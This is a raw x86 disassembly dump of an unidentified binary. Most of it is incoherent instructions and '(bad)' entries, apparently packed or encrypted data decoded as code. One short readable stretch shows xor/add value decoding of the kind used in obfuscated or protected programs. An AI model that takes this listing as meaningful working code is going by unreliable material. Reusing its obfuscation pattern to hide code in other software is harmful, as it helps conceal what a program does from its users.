  4049ec:	loope  0x4049b4
  4049ee:	in     al,dx
  4049ef:	les    edi,FWORD PTR [ebp+0x4f]
  4049f2:	shl    DWORD PTR [eax-0x7f],1
  4049f5:	(bad)  
  4049f6:	retf   0xbecd
  4049f9:	adc    ebx,edx
  4049fb:	test   eax,0x65a2496d
  404a00:	mov    esp,0x58b8ab36
  404a05:	sahf   
  404a06:	xor    eax,0x67c151f4
  404a0b:	ficom  WORD PTR [edx+0x60]
  404a0e:	ins    DWORD PTR es:[edi],dx
  404a0f:	sbb    edi,eax
  404a11:	(bad)  
  404a12:	clc    
  404a13:	mov    ds:0x61146817,al
  404a18:	or     esp,DWORD PTR [eax-0x74066684]
  404a1e:	sbb    eax,0xd257ec36
  404a23:	or     BYTE PTR [ecx+0x447bf15c],bl
  404a29:	je     0x4049f6
  404a2b:	dec    edx
  404a2c:	push   0x61
  404a2e:	and    BYTE PTR [esi+0x35],dh
  404a31:	cmp    al,0x7a
  404a33:	xlat   BYTE PTR ds:[ebx]
  404a34:	xor    cl,ch
  404a36:	scas   eax,DWORD PTR es:[edi]
  404a37:	sub    BYTE PTR [ebx],ch
  404a39:	add    BYTE PTR [ebx-0x330346f7],bl
  404a3f:	inc    edi
  404a40:	jns    0x404a35
  404a42:	push   ecx
  404a43:	inc    esi
  404a44:	mov    ah,0x15
  404a47:	sub    esp,DWORD PTR [ebx+edi*8]
  404a4a:	xchg   ebp,eax
  404a4b:	test   DWORD PTR [eax],eax
  404a4d:	lods   eax,DWORD PTR ds:[esi]
  404a4e:	push   0x3e
  404a50:	fldenv [ecx-0x78406bc2]
  404a56:	stos   DWORD PTR es:[edi],eax
  404a57:	xchg   edx,eax
  404a58:	es and bh,dh
  404a5b:	mov    dh,0x26
  404a5d:	mov    esp,0x8e74f975
  404a62:	aaa    
  404a63:	ds push cs
  404a65:	(bad)  
  404a66:	xor    ah,BYTE PTR ds:0xa12a4f41
  404a6c:	xchg   BYTE PTR [ecx+0x5706a98d],dh
  404a72:	xor    ebp,DWORD PTR [esi-0x60c3b1a1]
  404a78:	push   esp
  404a79:	nop
  404a7a:	leave  
  404a7b:	lock push 0xffffff94
  404a7e:	xor    edx,esi
  404a80:	(bad)  [esi-0x55]
  404a83:	adc    al,0x1c
  404a85:	jbe    0x404a30
  404a87:	mov    esi,0xd05e5563
  404a8c:	jno    0x404af5
  404a8e:	aam    0x86
  404a90:	add    al,0xfb
  404a92:	je     0x404b0c
  404a94:	mov    esp,DWORD PTR [ecx]
  404a96:	repnz pop ebx
  404a98:	jo     0x404a9b
  404a9a:	push   edi
  404a9b:	out    0xb4,al
  404a9d:	sbb    eax,0x37e8bdf8
  404aa2:	loope  0x404ab2
  404aa4:	push   eax
  404aa5:	mov    edi,0x69613325
  404aaa:	inc    esi
  404aab:	gs xchg ecx,eax
  404aad:	cmp    al,0x1
  404aaf:	test   al,0x73
  404ab1:	dec    edi
  404ab2:	pop    es
  404ab3:	mov    ah,0x5c
  404ab5:	sbb    cl,dl
  404ab7:	fbstp  TBYTE PTR [ebp+0x62]
  404aba:	adc    DWORD PTR [edx],edx
  404abc:	sar    DWORD PTR [ebx+0x5323d59b],0xd
  404ac3:	dec    esp
  404ac4:	jl     0x404a49
  404ac6:	xlat   BYTE PTR ds:[ebx]
  404ac7:	(bad)  
  404ac8:	sbb    BYTE PTR [eax],bh
  404aca:	add    eax,0x1fa53203
  404acf:	js     0x404b13
  404ad1:	sbb    edi,DWORD PTR [eax-0x351675fb]
  404ad7:	and    eax,0xacdd2044
  404adc:	sub    eax,0x80f612cf
  404ae1:	andnps xmm0,XMMWORD PTR [ebx]
  404ae4:	stos   DWORD PTR es:[edi],eax
  404ae5:	mov    edi,0x9f2afb78
  404aea:	popa   
  404aeb:	pop    edi
  404aec:	pop    edi
  404aed:	mov    ebp,0x88e5cb5f
  404af2:	ja     0x404b73
  404af4:	sub    DWORD PTR [esi-0x5afa6a83],0xbf519dbd
  404afe:	mov    ah,0xbd
  404b00:	sub    eax,0x2c70bca0
  404b05:	jb     0x404b72
  404b07:	pop    eax
  404b08:	fdivr  DWORD PTR [esi]
  404b0a:	pop    ds
  404b0b:	inc    edx
  404b0c:	mov    al,ds:0xadc004db
  404b11:	cli    
  404b12:	clc    
  404b13:	add    edx,DWORD PTR [edx-0x34]
  404b16:	imul   ecx,DWORD PTR ds:0x8ac1355,0xffffff82
  404b1d:	xor    dl,BYTE PTR [ebp-0x41eab0cc]
  404b23:	rcl    BYTE PTR [eax+0x72],cl
  404b26:	or     ah,BYTE PTR [ebp+0x4c]
  404b29:	and    BYTE PTR [esi],bh
  404b2b:	(bad)  
  404b2d:	push   cs
  404b2e:	rcr    DWORD PTR [edx+ebx*4+0x51],cl
  404b32:	aas    
  404b33:	popf   
  404b34:	and    cl,ch
  404b36:	loope  0x404aff
  404b38:	mov    cl,0xe4
  404b3a:	sub    BYTE PTR [eax],dl
  404b3c:	ja     0x404b09
  404b3e:	fsubrp st(3),st
  404b40:	push   0xaa122ed6
  404b45:	sub    ch,ch
  404b47:	jle    0x404b48
  404b49:	fsub   QWORD PTR [edi+0x6c9ee3bb]
  404b4f:	repnz pop eax
  404b51:	or     ecx,DWORD PTR [ebp+0x18]
  404b54:	pop    ebx
  404b55:	scas   eax,DWORD PTR es:[di]
  404b57:	inc    esi
  404b58:	pop    ebx
  404b59:	jg     0x404af5
  404b5b:	jns    0x404bc2
  404b5d:	fsubr  st(7),st
  404b5f:	fcom   QWORD PTR ds:0x23c61ae7
  404b65:	scas   eax,DWORD PTR es:[edi]
  404b66:	adc    BYTE PTR [ebp-0x3f],bh
  404b69:	sbb    al,0x13
  404b6b:	xchg   esi,eax
  404b6c:	or     dl,bh
  404b6e:	int    0x7c
  404b70:	ss sub eax,edi
  404b73:	adc    BYTE PTR [ecx+0x1c],0xff
  404b77:	mov    al,0x32
  404b79:	aam    0x94
  404b7b:	pop    eax
  404b7c:	xchg   DWORD PTR [eax-0x65c2d284],eax
  404b82:	ret    0x55f2
  404b85:	cmc    
  404b86:	add    esp,DWORD PTR [ebp+0x65352a38]
  404b8c:	jecxz  0x404b3f
  404b8e:	in     eax,dx
  404b8f:	mov    BYTE PTR [ecx+eiz*4+0x5a],ah
  404b93:	in     eax,dx
  404b94:	test   eax,0x21145eaf
  404b99:	jmp    DWORD PTR ds:0xa37dc10c
  404b9f:	sbb    eax,0x63f50df
  404ba4:	jmp    0x404c1d
  404ba6:	repz mov bl,0xc3
  404ba9:	ds lahf 
  404bab:	rcl    ecx,0x9a
  404bae:	dec    edi
  404baf:	adc    eax,0x2ccd44e4
  404bb4:	not    DWORD PTR [esi+0x37dfacaf]
  404bba:	pushf  
  404bbb:	in     al,0x94
  404bbd:	(bad)  
  404bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bbf:	retf   0x86f6
  404bc2:	ja     0x404bd7
  404bc4:	loopne 0x404c07
  404bc6:	not    DWORD PTR [esi]
  404bc8:	sbb    al,0x8
  404bca:	push   ebp
  404bcb:	sbb    BYTE PTR [esi-0x6d2d39d3],bl
  404bd1:	adc    eax,0x6bf108b6
  404bd6:	adc    BYTE PTR ss:[eax+ecx*4+0x31],cl
  404bdb:	mov    al,ds:0x9085497d
  404be0:	mov    ah,0x49
  404be2:	jmp    0x404b8e
  404be4:	mov    eax,ds:0x91c3e405
  404be9:	xchg   edi,eax
  404bea:	enter  0x1dc1,0xa9
  404bee:	cld    
  404bef:	xchg   ebx,eax
  404bf0:	ins    DWORD PTR es:[edi],dx
  404bf1:	pop    DWORD PTR [edx+ebx*1-0x154fb68a]
  404bf8:	sbb    ch,BYTE PTR es:[edx+0xd]
  404bfc:	sub    eax,0x5bffb4de
  404c01:	xchg   ecx,eax
  404c02:	mov    al,ds:0xfc2e3a8
  404c07:	or     al,0xd1
  404c09:	sub    BYTE PTR [ebp+ebx*8+0x2bbac372],bh
  404c10:	inc    ecx
  404c11:	xchg   esi,eax
  404c12:	adc    ebx,DWORD PTR [ebx-0x3a]
  404c15:	lods   al,BYTE PTR es:[esi]
  404c17:	dec    ebp
  404c18:	inc    edx
  404c19:	retf   
  404c1a:	pop    ss
  404c1b:	aad    0x2d
  404c1d:	popa   
  404c1e:	in     eax,dx
  404c1f:	cs push esp
  404c21:	cdq    
  404c22:	push   0x23
  404c24:	add    bl,BYTE PTR [esi+0x57]
  404c27:	xor    al,0x4a
  404c29:	inc    ecx
  404c2a:	adc    eax,0x7bfed2dc
  404c2f:	push   edi
  404c30:	xor    ecx,ecx
  404c32:	les    ebx,FWORD PTR [eax]
  404c34:	and    dl,ah
  404c36:	adc    eax,0x99e38534
  404c3b:	ins    BYTE PTR es:[edi],dx
  404c3c:	into   
  404c3d:	leave  
  404c3e:	dec    esp
  404c3f:	push   ebp
  404c40:	loope  0x404c6b
  404c42:	test   eax,0xf3875b0
  404c47:	js     0x404c6b
  404c49:	fmul   st,st(7)
  404c4b:	ss or  ch,dh
  404c4e:	out    dx,al
  404c4f:	sbb    cl,BYTE PTR [ecx-0x47]
  404c52:	loop   0x404bdf
  404c54:	xchg   BYTE PTR [esi],bl
  404c56:	leave  
  404c57:	cmp    ecx,DWORD PTR [ecx]
  404c59:	test   al,0x38
  404c5b:	loopne 0x404c98
  404c5d:	mov    dh,0x1
  404c5f:	(bad)  [ecx]
  404c61:	fwait
  404c62:	inc    esp
  404c63:	rol    ebp,1
  404c65:	adc    esi,DWORD PTR [eax+0x35ec8e7]
  404c6b:	fadd   st,st(4)
  404c6d:	ret    
  404c6e:	cld    
  404c6f:	leave  
  404c70:	int    0x2e
  404c72:	call   0x8112dd44
  404c77:	mov    bh,0x75
  404c79:	push   edi
  404c7a:	test   BYTE PTR [ebx-0x49],bl
  404c7d:	jae    0x404c8c
  404c7f:	mov    ch,0x3c
  404c81:	adc    cl,BYTE PTR [edx+0x36]
  404c84:	das    
  404c85:	jae    0x404c9c
  404c87:	inc    edx
  404c88:	lods   eax,DWORD PTR ds:[esi]
  404c89:	xchg   esi,eax
  404c8a:	or     al,0x49
  404c8c:	call   0x92a2164e
  404c91:	retf   
  404c92:	xcrypt-cbc (bad)
  404c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c94:	adc    al,0xbc
  404c96:	ins    BYTE PTR es:[edi],dx
  404c97:	sti    
  404c98:	push   edx
  404c99:	xchg   edx,eax
  404c9a:	cmc    
  404c9b:	sbb    DWORD PTR ds:0x835e646f,ecx
  404ca1:	daa    
  404ca2:	jb     0x404c66
  404ca4:	jp     0x404c33
  404ca6:	(bad)  
  404ca7:	(bad)  
  404ca8:	mov    dh,0x37
  404caa:	sbb    al,0x36
  404cac:	in     eax,dx
  404cad:	xchg   ebp,eax
  404cae:	mov    esi,edi
  404cb0:	sbb    ebp,DWORD PTR [edi+ebx*4+0x5130098d]
  404cb7:	push   es
  404cb8:	add    al,0xc7
  404cba:	test   eax,0x2430fe75
  404cbf:	stc    
  404cc0:	sub    ax,0xb2d1
  404cc4:	inc    esi
  404cc5:	sbb    BYTE PTR [ebx-0x2674b405],dh
  404ccb:	fiadd  WORD PTR [edi-0x532fdb95]
  404cd1:	hlt    
  404cd2:	jecxz  0x404d38
  404cd4:	in     eax,0xb5
  404cd6:	add    eax,0x3f86a91f
  404cdb:	imul   ebx,DWORD PTR [ebp+0x71],0xffffffab
  404cdf:	xchg   edi,ebx
  404ce1:	and    BYTE PTR [ebx+0x76],dl
  404ce4:	pop    ds
  404ce5:	inc    ebp
  404ce6:	lea    ecx,[edx-0x24]
  404ce9:	arpl   WORD PTR [edi],bx
  404ceb:	push   ebp
  404cec:	mov    ch,0x79
  404cee:	push   ebp
  404cef:	in     eax,dx
  404cf0:	aaa    
  404cf1:	popf   
  404cf2:	out    0x59,al
  404cf4:	test   eax,0x7b437eea
  404cf9:	push   0xffffffa4
  404cfb:	jmp    0x3714:0xc4ea7300
  404d02:	push   ds
  404d03:	or     DWORD PTR [esi+0x5e6998ac],esi
  404d09:	and    al,BYTE PTR [ebx]
  404d0b:	mov    edi,0x42e6ff05
  404d11:	add    BYTE PTR [eax+0xe],bl
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x6a]
  404d39:	push   ss
  404d3a:	xor    eax,0x702e966d
  404d3f:	jo     0x404d7e
  404d41:	jge    0x404db3
  404d43:	jo     0x404d1c
  404d45:	push   edi
  404d46:	lahf   
  404d47:	stos   BYTE PTR es:[edi],al
  404d48:	mov    ds:0xeb7a434c,eax
  404d4d:	push   ebp
  404d4e:	in     al,0xca
  404d50:	mov    ds:0x8181b47e,al
  404d55:	and    bh,bh
  404d57:	retf   
  404d58:	call   0xc9b0:0x6c15dbf6
  404d5f:	imul   edx
  404d61:	js     0x404dc7
  404d63:	ja     0x404d75
  404d65:	jmp    FWORD PTR [esi+0x79]
  404d68:	jo     0x404d75
  404d6a:	bound  ebp,QWORD PTR [esi]
  404d6c:	jecxz  0x404da0
  404d6e:	cmc    
  404d6f:	out    0xe5,eax
  404d71:	push   esi
  404d72:	sar    BYTE PTR [ebx-0x28],1
  404d75:	add    BYTE PTR [eax-0x4c4bbba1],al
  404d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d7c:	xlat   BYTE PTR ds:[ebx]
  404d7d:	jecxz  0x404d11
  404d7f:	mov    edi,0x1fb9a92d
  404d84:	pusha  
  404d85:	out    0x33,al
  404d87:	fimul  DWORD PTR [esi-0x7c4353bf]
  404d8d:	xchg   BYTE PTR ds:0xc8db9601,al
  404d93:	pop    es
  404d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d95:	adc    DWORD PTR [ebx+0x2e],0xced972a4
  404d9c:	mov    dl,0x99
  404d9e:	imul   ecx,DWORD PTR [ebp-0x47],0xe
  404da2:	sbb    BYTE PTR [ebp+edi*4+0x6a],0x83
  404da7:	adc    al,0xf4
  404da9:	and    DWORD PTR [ebx-0xb4b1416],0x4f
  404db0:	call   0x7cafcb76
  404db5:	adc    ebx,DWORD PTR ds:0xaf526415
  404dbb:	pushf  
  404dbc:	prefetch (bad)
  404dbd:	or     eax,0xb8013de
  404dc2:	pop    esp
  404dc3:	adc    ch,BYTE PTR fs:[ebx+edx*4-0x23cee439]
  404dcb:	int3   
  404dcc:	ins    BYTE PTR es:[edi],dx
  404dcd:	sub    dl,BYTE PTR [esi-0x4a82e145]
  404dd3:	in     eax,dx
  404dd4:	imul   ebp,DWORD PTR [esi-0x61],0xffffffc7
  404dd8:	dec    esp
  404dd9:	shr    BYTE PTR [eax+ebx*1+0x13],cl
  404ddd:	add    DWORD PTR [esi+0x133abf87],edi
  404de3:	and    DWORD PTR gs:[ebx-0x433d0414],esi
  404dea:	adc    DWORD PTR [edx+0x1f],edi
  404ded:	nop
  404dee:	pop    ds
  404def:	aas    
  404df0:	cmp    esp,DWORD PTR [eax+ecx*4]
  404df3:	addr16 or al,0x62
  404df6:	ret    
  404df7:	daa    
  404df8:	xchg   DWORD PTR [ecx-0x19],esi
  404dfb:	add    ah,dh
  404dfd:	xchg   esp,eax
  404dfe:	push   ebx
  404dff:	dec    edx
  404e00:	pop    esp
  404e01:	sahf   
  404e02:	fisubr WORD PTR [edx]
  404e04:	cmp    DWORD PTR [ecx+ebp*1],esi
  404e07:	int3   
  404e08:	xor    dh,ah
  404e0a:	sbb    ch,dl
  404e0c:	mov    ds:0xb9a7b330,al
  404e11:	mov    eax,0xd1c257bc
  404e16:	lock mov ecx,0xab015a6a
  404e1c:	pop    ss
  404e1d:	xchg   ebp,eax
  404e1e:	scas   eax,DWORD PTR es:[edi]
  404e1f:	pop    esp
  404e20:	imul   esp,ebx,0xffffffc6
  404e23:	inc    DWORD PTR [ecx]
  404e25:	scas   al,BYTE PTR es:[edi]
  404e26:	js     0x404e64
  404e28:	fbstp  TBYTE PTR [esp+ebp*8+0x55]
  404e2c:	repnz das 
  404e2e:	repnz mov al,ds:0x41893f88
  404e34:	push   ss
  404e35:	sbb    eax,0xcc3083a1
  404e3a:	sbb    BYTE PTR [ebp-0x36f26ed9],cl
  404e40:	(bad)  
  404e41:	imul   ebx,DWORD PTR [ebp-0x40],0xdb12033
  404e48:	and    al,0xa0
  404e4a:	pusha  
  404e4b:	jmp    0x404ebe
  404e4d:	repnz std 
  404e4f:	mov    al,ch
  404e51:	cmp    eax,0x89c37bed
  404e56:	mov    al,BYTE PTR [esp+ebp*1-0x35]
  404e5a:	jl     0x404e59
  404e5c:	mov    ?,esp
  404e5e:	mov    bl,0x53
  404e60:	cmp    eax,0xee25c32f
  404e65:	push   0xfffffff4
  404e67:	cli    
  404e68:	mov    ds:0x77d3143c,eax
  404e6d:	test   BYTE PTR [edx+eax*2],0xbf
  404e71:	cmp    eax,0xb332648c
  404e76:	jns    0x404dff
  404e78:	push   ecx
  404e79:	and    eax,0x4886e1e8
  404e7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e7f:	jne    0x404e86
  404e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e82:	jnp    0x404e4b
  404e84:	push   ebp
  404e85:	retf   0xe614
  404e88:	add    eax,0xc27b36c
  404e8d:	les    ebp,FWORD PTR [esi+0x1d]
  404e90:	in     eax,0x31
  404e92:	xor    BYTE PTR [ebx+0x22],al
  404e95:	popa   
  404e96:	sbb    BYTE PTR [ebp-0x30],ch
  404e99:	pop    ebp
  404e9a:	or     BYTE PTR [edx+0x59],dl
  404e9d:	mov    al,0x95
  404e9f:	mov    edi,0x9910b807
  404ea4:	neg    BYTE PTR [esi]
  404ea6:	jno    0x404e41
  404ea8:	push   es
  404ea9:	jecxz  0x404ee2
  404eab:	fs aaa 
  404ead:	scas   eax,DWORD PTR es:[edi]
  404eae:	arpl   WORD PTR [esp+eax*4],bx
  404eb1:	or     DWORD PTR [esi],esi
  404eb3:	mov    ebp,0xa3ff9ec4
  404eb8:	(bad)  
  404eb9:	adc    ch,al
  404ebb:	sti    
  404ebc:	ja     0x404edf
  404ebe:	push   ss
  404ebf:	pop    ebx
  404ec0:	pusha  
  404ec1:	lods   al,BYTE PTR ds:[esi]
  404ec2:	cmp    BYTE PTR [ebp-0x12],dh
  404ec5:	imul   edx,DWORD PTR [esi+0x16],0xffffffd0
  404ec9:	pop    ds
  404eca:	ds push ecx
  404ecc:	out    0x53,eax
  404ece:	xchg   ebx,eax
  404ecf:	cmp    ch,bh
  404ed1:	std    
  404ed2:	ins    DWORD PTR es:[edi],dx
  404ed3:	xor    eax,0x15a350c3
  404ed8:	sub    eax,0xbfd5ba11
  404edd:	jo     0x404eeb
  404edf:	scas   al,BYTE PTR es:[edi]
  404ee0:	les    esi,FWORD PTR [ecx+0x617325ec]
  404ee6:	outs   dx,DWORD PTR ds:[esi]
  404ee7:	mov    edx,0xd524a23d
  404eec:	push   ss
  404eed:	shl    DWORD PTR [eax],1
  404eef:	fstp   TBYTE PTR [edi-0x7b84044]
  404ef5:	(bad)  
  404ef6:	leave  
  404ef7:	es mov esp,0x1bfbe854
  404efd:	scas   al,BYTE PTR es:[edi]
  404efe:	push   0x41
  404f00:	fmul   st(0),st
  404f02:	mov    ebx,0xab8f7ee1
  404f07:	(bad)
  404f0c:	inc    edi
  404f0d:	imul   BYTE PTR [esi]
  404f0f:	mov    esp,DWORD PTR [eax+0x1b23c808]
  404f15:	test   al,0xe
  404f17:	mov    dh,0x3d
  404f19:	pop    esp
  404f1a:	sbb    al,0xed
  404f1c:	sub    eax,0x8cdae0b6
  404f21:	(bad)  
  404f22:	aaa    
  404f23:	dec    edx
  404f24:	bound  ecx,QWORD PTR [eax]
  404f26:	mov    ecx,0xd1dd15a9
  404f2b:	and    al,0xe8
  404f2d:	adc    al,0xcf
  404f2f:	fadd   DWORD PTR [edi+0x11]
  404f32:	xor    ebx,DWORD PTR [ecx]
  404f34:	ret    0xfa69
  404f37:	and    al,0x32
  404f39:	out    0x11,eax
  404f3b:	pop    esp
  404f3c:	mov    DWORD PTR [ebx],ecx
  404f3e:	mov    dh,0x3b
  404f40:	test   eax,0x1761fb47
  404f45:	push   ecx
  404f46:	rcr    BYTE PTR [ebx-0xdd1d4d3],1
  404f4c:	cld    
  404f4d:	mov    ah,0xb4
  404f4f:	jmp    0xadc2b4a7
  404f54:	xchg   ecx,eax
  404f55:	ret    0x9465
  404f58:	out    dx,eax
  404f59:	inc    esi
  404f5a:	push   esi
  404f5b:	in     eax,0xfa
  404f5d:	push   esp
  404f5e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f60:	or     DWORD PTR [edi+ebx*2-0x19ce6609],esi
  404f67:	push   esp
  404f68:	jmp    0xed024214
  404f6d:	sub    eax,ebp
  404f6f:	pop    ds
  404f70:	mov    dh,BYTE PTR [esi-0xf]
  404f73:	push   eax
  404f74:	call   0x8230cd80
  404f79:	(bad)  
  404f7a:	pop    ecx
  404f7b:	scas   eax,DWORD PTR es:[edi]
  404f7c:	sub    eax,DWORD PTR [esi+0x1d]
  404f7f:	dec    esp
  404f80:	cmp    al,0x69
  404f82:	add    al,0xb8
  404f85:	sbb    eax,0xa5a70b03
  404f8a:	jmp    0x404ffe
  404f8c:	jmp    DWORD PTR [ebp+0x42074d72]
  404f92:	outs   dx,DWORD PTR ds:[esi]
  404f93:	mov    BYTE PTR [ebx+0x58],ah
  404f96:	stos   BYTE PTR es:[edi],al
  404f97:	clc    
  404f98:	je     0x404ff8
  404f9a:	or     esi,DWORD PTR [edi]
  404f9c:	cmp    BYTE PTR [esi-0x4720d65],ah
  404fa2:	mov    eax,ds:0x1d80eda8
  404fa7:	mov    esp,DWORD PTR [ecx+0x632cb09f]
  404fad:	mov    cl,BYTE PTR [esi+0x7a]
  404fb0:	in     al,dx
  404fb1:	mov    cl,0x40
  404fb3:	cli    
  404fb4:	js     0x404f84
  404fb6:	fsubp  st(0),st
  404fb8:	pop    ds
  404fb9:	inc    edx
  404fba:	cmp    BYTE PTR [edx-0x3054bfc0],bl
  404fc0:	ret    0x1a16
  404fc3:	jle    0x40501e
  404fc5:	mov    esp,0xa65bf340
  404fca:	call   0x5f16:0x7dedbd4d
  404fd1:	fbld   TBYTE PTR [eax+ebx*4-0x41d6301c]
  404fd8:	(bad)  
  404fda:	mov    ss,edi
  404fdc:	mov    edi,0xfa84e2cf
  404fe1:	pop    edi
  404fe2:	aas    
  404fe3:	rcl    BYTE PTR [edx],cl
  404fe5:	dec    DWORD PTR [edi+0x2a3c0865]
  404feb:	jo     0x405022
  404fed:	in     al,0xce
  404fef:	repnz lods al,BYTE PTR ds:[esi]
  404ff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ff2:	mov    edi,?
  404ff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ff5:	cmp    eax,0xd739a981
  404ffa:	inc    eax
  404ffb:	loopne 0x40503e
  404ffd:	test   BYTE PTR [ecx+edi*8+0x78],ah
  405001:	jnp    0x40500b
  405003:	test   al,0x14
  405005:	cmp    eax,0x16d5a7f1
  40500a:	and    bl,0xde
  40500d:	push   esi
  40500e:	imul   edx,DWORD PTR [ebp+0x45],0xe22ce280
  405015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405016:	ss retf 0xca46
  40501a:	je     0x40508f
  40501c:	dec    ecx
  40501d:	stos   DWORD PTR es:[edi],eax
  40501e:	out    dx,eax
  40501f:	call   0xf7f3e1df
  405024:	stos   DWORD PTR es:[edi],eax
  405025:	hlt    
  405026:	sbb    ebp,DWORD PTR [ebx-0x5f0d8cf2]
  40502c:	jp     0x4050a1
  40502e:	mov    ah,BYTE PTR [edi]
  405030:	stc    
  405031:	jmp    0xee53:0x2f957803
  405038:	mov    al,cs:0x3645de05
  40503e:	stos   DWORD PTR es:[edi],eax
  40503f:	mov    ss,WORD PTR ds:0x983a48de
  405045:	and    edx,DWORD PTR [ebx+ecx*1]
  405048:	fwait
  405049:	xlat   BYTE PTR ds:[ebx]
  40504a:	arpl   WORD PTR [ebp-0xe690bf2],bp
  405050:	ret    
  405051:	sub    al,0xc8
  405053:	and    eax,ebx
  405055:	ret    
  405056:	push   esp
  405057:	test   DWORD PTR [esi-0x16e883c6],edx
  40505d:	mov    ebp,gs
  40505f:	sub    al,0xad
  405061:	pop    ds
  405062:	ficom  DWORD PTR [eax-0x57]
  405065:	repz inc edx
  405067:	mov    ebp,DWORD PTR [edi+edx*2+0x36c9542c]
  40506e:	push   ss
  40506f:	test   eax,0x21d88fe
  405074:	mov    cs,WORD PTR [eax+0x3acf33a3]
  40507a:	jae    0x405023
  40507c:	cmc    
  40507d:	sbb    al,0x2f
  40507f:	sbb    BYTE PTR [ebx+0x1c],dl
  405082:	and    al,BYTE PTR [edx+0x76]
  405085:	cmp    eax,0xf4458b1b
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shl    DWORD PTR [edx],0x85
  405133:	sub    eax,0x702b53ed
  405138:	jo     0x405177
  40513a:	jge    0x4051ac
  40513c:	jo     0x405106
  40513e:	ret    
  40513f:	aam    0x94
  405141:	les    ebx,FWORD PTR [eax]
  405143:	push   edx
  405144:	ins    BYTE PTR es:[edi],dx
  405145:	xor    DWORD PTR [edx],edx
  405147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405148:	stos   BYTE PTR es:[edi],al
  405149:	pop    ebx
  40514a:	jp     0x405123
  40514c:	loopne 0x4051a5
  40514e:	hlt    
  40514f:	xor    al,0x6a
  405151:	push   0x8bf49704
  405156:	jnp    0x405194
  405158:	test   eax,0x93147171
  40515d:	mov    ds:0xbb48a646,eax
  405162:	std    
  405163:	and    DWORD PTR [eax+0x3674834f],ecx
  405169:	push   ecx
  40516a:	mov    ebp,edx
  40516c:	fild   DWORD PTR [ebx+0x8]
  40516f:	push   edx
  405170:	mov    ?,eax
  405172:	cmp    al,BYTE PTR [ebx+0x2385edb7]
  405178:	jecxz  0x405107
  40517a:	mov    ds:0xad317e93,eax
  40517f:	into   
  405180:	or     BYTE PTR [edi+ebx*4],bh
  405183:	push   0x5f623960
  405188:	aad    0x8d
  40518a:	mov    al,ds:0x577dd23c
  40518f:	and    DWORD PTR [ecx-0x75919790],edi
  405195:	adc    cl,BYTE PTR [edx-0x2002e571]
  40519b:	cmp    esi,DWORD PTR [esi-0x64]
  40519e:	sahf   
  40519f:	sahf   
  4051a0:	pop    edx
  4051a1:	mov    bl,0x3e
  4051a3:	or     cl,BYTE PTR [eax]
  4051a5:	push   ecx
  4051a6:	mov    dh,0xd8
  4051a8:	test   cl,ah
  4051aa:	mov    dh,BYTE PTR [eax+0x44a7c9ab]
  4051b0:	xchg   ecx,eax
  4051b1:	(bad)  
  4051b2:	cmp    DWORD PTR [ebp-0xced7b19],eax
  4051b8:	test   BYTE PTR [ebx+0x410e765d],dh
  4051be:	frstor [ebp+0x3bef078e]
  4051c4:	xchg   edi,eax
  4051c5:	and    edi,DWORD PTR [ebx+0x74]
  4051c8:	cs mov bl,0x6
  4051cb:	stos   DWORD PTR es:[edi],eax
